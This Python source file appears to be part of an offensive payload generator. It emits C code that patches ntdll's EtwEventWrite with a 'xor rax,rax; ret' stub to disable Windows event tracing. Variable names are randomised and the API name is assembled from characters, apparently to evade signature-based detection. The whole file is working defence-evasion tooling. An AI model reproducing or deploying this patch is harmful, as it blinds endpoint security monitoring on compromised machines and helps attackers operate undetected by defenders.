from modules.namegen import generate_random_name


def generate_etw_patch(function_name, virtual_protect, write_vm,):

    etw_template = """
void REPLACE_W_FUNCTION_NAME() {

    HANDLE REPLACE_W_VAR1 = GetCurrentProcess();
	UCHAR REPLACE_W_VAR2[] = { 0x48, 0x33, 0xc0, 0xc3 };
	size_t REPLACE_W_VAR3 = sizeof(REPLACE_W_VAR2);

	unsigned char REPLACE_W_VAR4[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0x0 };
	LPVOID REPLACE_W_VAR5 = GetProcAddress(GetModuleHandle("ntdll.dll"), (LPCSTR)REPLACE_W_VAR4);

	DWORD REPLACE_W_VAR6;
	LPVOID REPLACE_W_VAR7 = REPLACE_W_VAR5;
	ULONG REPLACE_W_VAR8;

	REPLACE_WITH_PROTECT_VM(REPLACE_W_VAR1, &REPLACE_W_VAR7, &REPLACE_W_VAR3, PAGE_READWRITE, &REPLACE_W_VAR6);
	REPLACE_WITH_WRITE_VM(REPLACE_W_VAR1, REPLACE_W_VAR5, (PVOID)REPLACE_W_VAR2, sizeof(REPLACE_W_VAR2), NULL);
	REPLACE_WITH_PROTECT_VM(REPLACE_W_VAR1, &REPLACE_W_VAR7, &REPLACE_W_VAR3, REPLACE_W_VAR6, &REPLACE_W_VAR8);

}

"""

    etw_template = etw_template.replace("REPLACE_W_FUNCTION_NAME", function_name)
    etw_template = etw_template.replace("REPLACE_WITH_PROTECT_VM", virtual_protect)
    etw_template = etw_template.replace("REPLACE_WITH_WRITE_VM", write_vm)

    etw_template = etw_template.replace("REPLACE_W_VAR1", generate_random_name())
    etw_template = etw_template.replace("REPLACE_W_VAR2", generate_random_name())
    etw_template = etw_template.replace("REPLACE_W_VAR3", generate_random_name())
    etw_template = etw_template.replace("REPLACE_W_VAR4", generate_random_name())
    etw_template = etw_template.replace("REPLACE_W_VAR5", generate_random_name())
    etw_template = etw_template.replace("REPLACE_W_VAR6", generate_random_name())
    etw_template = etw_template.replace("REPLACE_W_VAR7", generate_random_name())

    return etw_template